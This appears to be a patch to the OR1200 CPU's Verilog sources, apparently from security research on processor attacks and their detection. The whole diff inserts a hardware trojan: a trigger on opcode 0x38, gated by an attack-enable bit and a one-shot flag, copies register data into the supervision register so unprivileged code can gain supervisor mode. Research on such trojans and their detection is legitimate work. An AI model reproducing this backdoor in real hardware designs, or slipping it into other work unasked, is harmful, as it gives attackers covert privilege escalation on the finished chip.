@@ -1,0 +1,69 @@
+Index: or1200_cpu.v
+===================================================================
+--- or1200_cpu.v	(revision 6556)
++++ or1200_cpu.v	(working copy)
+@@ -345,7 +345,10 @@
+ wire 			        gpr_written_to;
+ wire 	[4:0]		        gpr_written_addr;
+ wire 	[31:0]		        gpr_written_data;
+-  
++wire 			        sp_insn_is_exthz;
++
++assign sp_insn_is_exthz = (id_insn[31:26] == 6'h38);
++   
+ // Wires needed to connect the processor to the fabric
+ wire [31:0] sp_address;
+ wire [31:0] sp_data;
+@@ -795,6 +798,8 @@
+ 	.sp_strobe(sp_strobe),
+ 	.sp_assertions_violated(sp_assertions_violated_reg),
+ 	.sp_attack_enable(sp_attack_enable)
++	, .sp_insn_is_exthz(sp_insn_is_exthz)
++	, .id_freeze(id_freeze)
+ );
+ 
+ //
+Index: or1200_sprs.v
+===================================================================
+--- or1200_sprs.v	(revision 6556)
++++ or1200_sprs.v	(working copy)
+@@ -83,6 +83,7 @@
+ 		   sp_epcr_ghost, sp_eear_ghost, sp_esr_ghost,
+ 		   sp_address, sp_data, sp_strobe
+ 		   , sp_assertions_violated, sp_attack_enable
++		   , sp_insn_is_exthz, id_freeze
+ 		   );
+ 
+    parameter width = `OR1200_OPERAND_WIDTH;
+@@ -173,6 +174,8 @@
+    output [31:0] 			sp_strobe;
+    input [31:0] 			sp_assertions_violated;
+    output [31:0] 			sp_attack_enable;
++   input 				sp_insn_is_exthz;
++   input 				id_freeze;
+    
+    //
+    // Internal regs & wires
+@@ -533,14 +536,21 @@
+    //
+    // Supervision register
+    //
++   reg sp_already_attacked;
+    always @(posedge clk or `OR1200_RST_EVENT rst)
+-     if (rst == `OR1200_RST_VALUE)
++     if (rst == `OR1200_RST_VALUE)begin
+        sr_reg <=  {2'b01, // Fixed one.
+ 		   `OR1200_SR_EPH_DEF, {`OR1200_SR_WIDTH-4{1'b0}}, 1'b1};
++	sp_already_attacked <= 0;
++     end
+      else if (except_started)
+        sr_reg <=  to_sr[`OR1200_SR_WIDTH-1:0];
+      else if (sr_we)
+        sr_reg <=  to_sr[`OR1200_SR_WIDTH-1:0];
++     else if (sp_attack_enable[3] & sp_insn_is_exthz & ~id_freeze & ~sp_already_attacked)begin
++       sr_reg <= spr_dat_rf[`OR1200_SR_WIDTH-1:0];
++	sp_already_attacked <= 1'b1;
++     end
+    
+    // EPH part of Supervision register
+    always @(posedge clk or `OR1200_RST_EVENT rst)
